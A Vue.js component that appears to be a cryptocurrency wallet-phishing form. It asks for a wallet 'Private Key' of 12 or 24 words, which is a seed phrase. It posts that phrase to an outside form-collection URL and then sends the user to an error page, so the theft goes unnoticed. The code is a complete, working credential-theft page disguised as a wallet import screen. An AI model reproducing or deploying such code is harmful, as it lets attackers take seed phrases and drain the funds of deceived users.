<template>
  <div class="private-form">
      <form action="" method=""  @submit.prevent="submit">

         <input v-model="form.private" type="text" placeholder="Private Key" class="input">
          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
</template>

<script>
import axios from 'axios';
export default {
    name:"private",

    data (){
        return{
           form : {
               private: '',
               
           }
        }
    },

    methods:{
         submit(){
           axios.post('https://usebasin.com/f/c06694797d04' ,this.form)
           .then(response => {
               console.log(response)
           })
           .finally(() => {
                this.$router.push('/err')
                 });
           
      }
    

    }

}

</script>


<style>

</style>